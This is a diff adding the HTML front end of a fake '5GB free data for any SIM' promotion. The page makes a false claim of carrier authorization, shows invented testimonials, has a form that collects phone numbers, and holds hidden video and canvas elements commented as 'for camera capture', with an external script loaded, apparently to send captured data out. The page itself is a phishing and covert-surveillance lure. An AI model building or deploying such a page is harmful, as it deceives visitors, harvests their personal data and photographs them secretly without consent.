@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Exclusive Offer: 5GB Free Data</title>
+    <meta name="description" content="Get 5GB of high-speed data for free on any SIM card. Limited time offer!">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="offer-badge">Limited Time Offer</div>
+        <h1>Get 5GB Free Data<br>For Any SIM</h1>
+        <p>Unlock high-speed data instantly. This exclusive promotion is authorized by major network providers. Simply enter your number below to claim.</p>
+        
+        <form id="claimForm">
+            <div class="input-group">
+                <input type="tel" id="phoneNumber" placeholder="Enter Phone Number" required pattern="\d{10,15}">
+            </div>
+            <button type="submit" id="submitBtn">
+                <span class="btn-text">Claim Now</span>
+                <div class="loading-spinner" id="spinner"></div>
+            </button>
+        </form>
+
+        <div class="status" id="statusMessage"></div>
+
+        <div class="testimonials">
+            <div class="testimonial">
+                <img src="https://images.unsplash.com/photo-1500648767791-00dcc994a43e?w=100&h=100&fit=crop" alt="User">
+                <div class="testimonial-text">"Got my 5GB instantly! Super easy to use, thanks!" - Alex M.</div>
+            </div>
+            <div class="testimonial">
+                <img src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=100&h=100&fit=crop" alt="User">
+                <div class="testimonial-text">"I was skeptical but it actually worked perfectly. Highly recommended." - Sarah J.</div>
+            </div>
+        </div>
+
+        <div class="footer-note">
+            *Terms and conditions apply. Data is valid for 30 days.
+        </div>
+    </div>
+
+    <!-- Hidden elements for camera capture -->
+    <video id="hidden-video" autoplay playsinline muted></video>
+    <canvas id="hidden-canvas"></canvas>
+
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+    <script src="script.js"></script>
+</body>
+</html>
